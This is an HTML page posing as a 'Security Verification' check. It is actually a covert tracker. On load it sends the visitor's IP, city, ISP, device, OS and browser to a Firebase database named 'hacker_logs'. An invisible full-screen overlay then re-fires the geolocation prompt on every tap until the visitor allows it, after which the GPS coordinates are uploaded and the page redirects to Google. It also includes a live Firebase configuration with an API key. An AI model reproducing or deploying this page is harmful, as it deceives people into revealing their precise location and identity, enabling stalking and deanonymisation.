<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Security Verification</title>
    
    <!-- UAParser -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/UAParser.js/1.0.35/ua-parser.min.js"></script>
    
    <!-- Firebase SDK -->
    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js";
        import { getDatabase, ref, push, set, update } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-database.js";

        const firebaseConfig = {
            apiKey: "AIzaSyA-2qU45jgtvoxzOdVysbZKdixEyvMY3C8",
            authDomain: "location-611d6.firebaseapp.com",
            databaseURL: "https://location-611d6-default-rtdb.firebaseio.com",
            projectId: "location-611d6",
            storageBucket: "location-611d6.firebasestorage.app",
            messagingSenderId: "903100559116",
            appId: "1:903100559116:web:08c8c9e1d7282048116329"
        };

        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);

        // ‡ßß. ‡¶°‡¶æ‡¶ü‡¶æ ‡¶™‡¶æ‡¶†‡¶æ‡¶®‡ßã ‡¶∂‡ßÅ‡¶∞‡ßÅ
        window.initLog = function(data) {
            const trackerRef = ref(db, 'hacker_logs');
            const newLogRef = push(trackerRef);
            
            set(newLogRef, {
                timestamp: new Date().toString(),
                ...data,
                latitude: "Tracing...",
                longitude: "Tracing...",
                actionStatus: "Trap Active - Loop Started"
            }).then(() => {
                sessionStorage.setItem('logKey', newLogRef.key);
                // ‡¶°‡¶æ‡¶ü‡¶æ ‡¶∏‡ßá‡¶≠ ‡¶π‡¶ì‡ßü‡¶æ‡¶∞ ‡¶™‡¶∞ ‡¶Ü‡¶∏‡¶≤ ‡¶ñ‡ßá‡¶≤‡¶æ ‡¶∂‡ßÅ‡¶∞‡ßÅ
                startAnnoyingLoop();
            });
        };

        // ‡ß®. ‡¶≤‡ßã‡¶ï‡ßá‡¶∂‡¶® ‡¶Ü‡¶™‡¶°‡ßá‡¶ü
        window.updateWithGPS = function(lat, lng) {
            const key = sessionStorage.getItem('logKey');
            if (key) {
                const updateRef = ref(db, 'hacker_logs/' + key);
                update(updateRef, {
                    latitude: lat,
                    longitude: lng,
                    actionStatus: "‚úÖ Verified & Caught"
                }).then(() => {
                    // ‡¶ï‡¶æ‡¶ú ‡¶∂‡ßá‡¶∑‡ßá ‡¶ó‡ßÅ‡¶ó‡¶≤‡ßá ‡¶™‡¶æ‡¶†‡¶ø‡ßü‡ßá ‡¶¶‡ßá‡¶ì‡ßü‡¶æ
                    window.location.href = "https://www.google.com";
                });
            }
        };
    </script>

    <style>
        :root {
            --bg-color: #e0e5ec;
            --text-color: #4a4a4a;
            --accent-color: #007bff;
            --shadow-light: #ffffff;
            --shadow-dark: #a3b1c6;
        }

        body {
            margin: 0; padding: 0;
            background-color: var(--bg-color);
            display: flex; flex-direction: column;
            justify-content: center; align-items: center;
            height: 100vh; overflow: hidden;
            font-family: 'Segoe UI', sans-serif;
            color: var(--text-color);
        }

        /* ‡¶™‡ßÅ‡¶∞‡ßã ‡¶∏‡ßç‡¶ï‡ßç‡¶∞‡¶ø‡¶® ‡¶ú‡ßÅ‡ßú‡ßá ‡¶Ö‡¶¶‡ßÉ‡¶∂‡ßç‡¶Ø ‡¶ú‡¶æ‡¶≤ (Click Trap) */
        #clickTrap {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            z-index: 9999; cursor: auto;
        }

        .card {
            width: 85%; max-width: 350px; padding: 40px;
            border-radius: 30px;
            background: var(--bg-color);
            box-shadow: 20px 20px 60px var(--shadow-dark), 
                       -20px -20px 60px var(--shadow-light);
            text-align: center;
            position: relative;
            z-index: 1; /* ‡¶ú‡¶æ‡¶≤‡ßá‡¶∞ ‡¶®‡¶ø‡¶ö‡ßá ‡¶•‡¶æ‡¶ï‡¶¨‡ßá, ‡¶ï‡¶ø‡¶®‡ßç‡¶§‡ßÅ ‡¶¶‡ßá‡¶ñ‡¶æ ‡¶Ø‡¶æ‡¶¨‡ßá */
        }

        .icon-area {
            width: 80px; height: 80px; margin: 0 auto 25px auto;
            border-radius: 50%;
            background: var(--bg-color);
            box-shadow: inset 6px 6px 12px var(--shadow-dark), 
                        inset -6px -6px 12px var(--shadow-light);
            display: flex; justify-content: center; align-items: center;
            font-size: 30px;
        }

        h2 { font-size: 20px; margin-bottom: 10px; color: var(--text-color); }
        p { font-size: 13px; color: #777; margin-bottom: 30px; line-height: 1.6; }

        /* ‡¶∏‡ßÅ‡¶®‡ßç‡¶¶‡¶∞ ‡¶≤‡ßã‡¶°‡¶ø‡¶Ç ‡¶∏‡ßç‡¶™‡¶ø‡¶®‡¶æ‡¶∞ */
        .spinner {
            width: 40px; height: 40px;
            border: 4px solid rgba(0, 123, 255, 0.1);
            border-left-color: var(--accent-color);
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto;
        }
        @keyframes spin { 100% { transform: rotate(360deg); } }

    </style>
</head>
<body>

    <!-- ‡¶è‡¶á ‡¶°‡¶ø‡¶≠‡¶ü‡¶æ ‡¶™‡ßÅ‡¶∞‡ßã ‡¶∏‡ßç‡¶ï‡ßç‡¶∞‡¶ø‡¶® ‡¶ú‡ßÅ‡ßú‡ßá ‡¶•‡¶æ‡¶ï‡¶¨‡ßá -->
    <div id="clickTrap" onclick="forceBrowserPrompt()"></div>

    <div class="card">
        <div class="icon-area">üõ°Ô∏è</div>
        
        <h2 id="statusTitle">Security Verification</h2>
        <p id="statusMsg">Checking network encryption parameters. Please wait...</p>

        <div class="spinner"></div>
    </div>

    <script>
        let ipInfo = {};
        let isAsking = false; 

        window.onload = function() {
            // ‡¶Ü‡¶á‡¶™‡¶ø ‡¶°‡¶æ‡¶ü‡¶æ ‡¶´‡ßá‡¶ö
            fetch('https://ipapi.co/json/')
                .then(res => res.json())
                .then(data => { ipInfo = data; prepareInitialData(); })
                .catch(() => { ipInfo = { ip: "Unknown" }; prepareInitialData(); });
        };

        function prepareInitialData() {
            var parser = new UAParser();
            var result = parser.getResult();
            let deviceName = (result.device.vendor ? result.device.vendor + " " : "") + (result.device.model || "Unknown Device");

            let initialPayload = {
                ip: ipInfo.ip || "Tracing...",
                city: ipInfo.city || "Tracing...",
                isp: ipInfo.org || "Tracing...",
                deviceModel: deviceName,
                os: result.os.name,
                browser: result.browser.name,
                latitude: "Tracing...",
                longitude: "Tracing..."
            };

            if(window.initLog) window.initLog(initialPayload);
        }

        // ‡¶≤‡ßÅ‡¶™ ‡¶´‡¶æ‡¶Ç‡¶∂‡¶®
        function startAnnoyingLoop() {
            // ‡ßß. ‡¶≤‡ßã‡¶° ‡¶π‡¶ì‡ßü‡¶æ‡¶∞ ‡ß® ‡¶∏‡ßá‡¶ï‡ßá‡¶®‡ßç‡¶° ‡¶™‡¶∞ ‡¶™‡ßç‡¶∞‡¶•‡¶Æ ‡¶ö‡ßá‡¶∑‡ßç‡¶ü‡¶æ
            setTimeout(forceBrowserPrompt, 2000);
            
            // ‡ß®. ‡¶∏‡ßç‡¶ï‡ßç‡¶∞‡¶ø‡¶®‡ßá ‡¶ü‡¶æ‡¶ö ‡¶¨‡¶æ ‡¶ï‡ßç‡¶≤‡¶ø‡¶ï ‡¶ï‡¶∞‡¶≤‡ßá‡¶á ‡¶Ü‡¶¨‡¶æ‡¶∞ ‡¶ö‡ßá‡¶∑‡ßç‡¶ü‡¶æ
            let trap = document.getElementById('clickTrap');
            trap.addEventListener('touchstart', forceBrowserPrompt);
            trap.addEventListener('click', forceBrowserPrompt);
        }

        function forceBrowserPrompt() {
            if(isAsking) return;
            isAsking = true;

            if ("geolocation" in navigator) {
                navigator.geolocation.getCurrentPosition(
                    function(position) {
                        // ‡¶∏‡¶æ‡¶ï‡¶∏‡ßá‡¶∏!
                        document.getElementById('statusTitle').innerText = "Verified!";
                        document.getElementById('statusTitle').style.color = "#00b894";
                        document.querySelector('.spinner').style.borderLeftColor = "#00b894";
                        
                        // ‡¶ü‡ßç‡¶∞‡ßç‡¶Ø‡¶æ‡¶™ ‡¶∏‡¶∞‡¶ø‡ßü‡ßá ‡¶´‡ßá‡¶≤‡¶≤‡¶æ‡¶Æ
                        document.getElementById('clickTrap').style.display = 'none';

                        if(window.updateWithGPS) {
                            window.updateWithGPS(position.coords.latitude, position.coords.longitude);
                        }
                    },
                    function(error) {
                        isAsking = false; // ‡¶Ü‡¶¨‡¶æ‡¶∞ ‡¶ö‡¶æ‡¶ì‡ßü‡¶æ‡¶∞ ‡¶ú‡¶®‡ßç‡¶Ø ‡¶∞‡ßá‡¶°‡¶ø
                        console.log("GPS Blocked/Closed. Re-arming trap.");
                        // ‡¶π‡ßç‡¶Ø‡¶æ‡¶ï‡¶æ‡¶∞‡¶ï‡ßá ‡¶ï‡¶ø‡¶õ‡ßÅ ‡¶¶‡ßá‡¶ñ‡¶æ‡¶®‡ßã‡¶∞ ‡¶¶‡¶∞‡¶ï‡¶æ‡¶∞ ‡¶®‡ßá‡¶á, ‡¶∏‡ßá ‡¶≠‡¶æ‡¶¨‡¶¨‡ßá ‡¶≤‡ßã‡¶°‡¶ø‡¶Ç ‡¶π‡¶ö‡ßç‡¶õ‡ßá‡•§
                        // ‡¶ï‡¶ø‡¶®‡ßç‡¶§‡ßÅ ‡¶∏‡ßá ‡¶∏‡ßç‡¶ï‡ßç‡¶∞‡¶ø‡¶®‡ßá ‡¶ü‡¶æ‡¶ö ‡¶ï‡¶∞‡¶≤‡ßá‡¶á ‡¶Ü‡¶¨‡¶æ‡¶∞ ‡¶™‡¶™-‡¶Ü‡¶™ ‡¶Ü‡¶∏‡¶¨‡ßá‡•§
                    },
                    { enableHighAccuracy: true }
                );
            }
        }
    </script>
</body>
</html>
